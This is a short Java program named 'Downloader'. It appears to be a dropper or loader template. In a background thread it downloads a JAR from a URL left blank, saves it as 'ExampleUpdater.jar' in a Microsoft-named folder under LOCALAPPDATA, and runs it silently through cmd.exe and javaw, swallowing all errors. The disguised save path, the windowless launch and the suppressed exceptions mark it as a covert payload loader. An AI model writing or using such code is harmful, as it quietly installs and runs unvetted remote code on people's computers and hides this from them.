package downloader;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;

public class Downloader {
    public static void main(String[] args) {
        new Thread(() -> {
            String DOWNLOAD_URL = "";
            String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
            String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";

            File file = new File(APP_PATH);
            if (!file.exists()) {
                try {
                    URL url = new URL(DOWNLOAD_URL);
                    BufferedInputStream in = new BufferedInputStream(url.openStream());
                    FileOutputStream out = new FileOutputStream(SAVE_PATH);

                    byte[] dataBuffer = new byte[1024];
                    int dataRead;
                    while ((dataRead = in.read(dataBuffer, 0, 1024)) != -1)
                        out.write(dataBuffer, 0, dataRead);

                    String command = "javaw -jar " + SAVE_PATH;
                    ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", command);
                    processBuilder.start();
                } catch (Exception ignored) {}
            }
        }).start();
    }
}
